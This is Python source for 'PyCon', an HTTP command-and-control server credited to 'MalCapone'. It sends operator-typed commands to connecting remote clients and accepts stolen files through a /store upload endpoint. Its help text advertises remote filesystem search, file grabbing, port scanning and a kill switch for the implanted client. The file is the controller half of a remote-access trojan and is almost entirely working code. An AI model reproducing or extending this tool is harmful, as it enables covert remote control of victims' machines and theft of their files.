import cgi
import pyCon.config as config
import pyCon.printer as p
from http.server import HTTPServer
from http.server import BaseHTTPRequestHandler

class PyConServer(BaseHTTPRequestHandler):

    def do_GET(self):
        command = input(f'{p.blue}[?] [{self.client_address[0]}]:> {p.RESET}')
        if command == '?':
            Show_Help()
        self.send_response_only(200, 'ok')
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        if self.path == '/store':
            try:
                ctype, var = cgi.parse_header(self.headers['Content-Type'])
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
                    fs_up = fs['file']
                    fs_d = fs_up
                    fx = fs_d.file.read().decode('utf-8')
                    print(fx)
                    file_content = fs['file'].read().decode('utf-8')
                    # filecontent = fs_up.read()
                    with open('../pyCon/uploads/fs_upload.txt','w') as file:
                        file.write(fs_up.file.read().decode('utf-8'))
                        self.send_response(200, 'ok')
                        self.end_headers()
                        self.flush_headers()
                        p.ok('File Upload Successful')
                        file.close()
                else:
                    p.exc('Unexpected POST request')
            except Exception as err:
                p.exc(str(err))
                return
        length  = int(self.headers['Content-Length'])
        postVar = self.rfile.read(length)
        self.send_response(200, 'ok')
        self.end_headers()
        self.flush_headers()
        p.ok(postVar.decode())
        return

    @staticmethod
    def begin():
        server = HTTPServer((config.HOST,config.PORT), PyConServer)
        try:
            server.serve_forever()
            p.ok(f'[{config.HOST}]: Server Started On Port {config.PORT}')
        except KeyboardInterrupt:
            p.exc('Server Has Been Terminated')

def start():
    srv = HTTPServer((config.HOST,config.PORT), PyConServer)
    try:
        p.ok(f'[{config.HOST}]: Server Now Running On Port {config.PORT}')
        srv.serve_forever()
    except KeyboardInterrupt:
        p.exc('Server Has Been Terminated')

def Show_Help():
    msg ="""
Help for PyCon Client Commands Program inherits all windows command line funtions.
\n\tsearch - Search remote filesystem: search <dir><file_extenstion>\n
\tkill   - Stop the remote client, can only be restarted form RM\n
\tgrab*  - Issues a grab command for file. grab*<path>\n
\tscan   - Scan RM and returns back the open port numbers\n
Produced by MalCapone\n"""
    print(msg)

if __name__ == '__main__':
    start()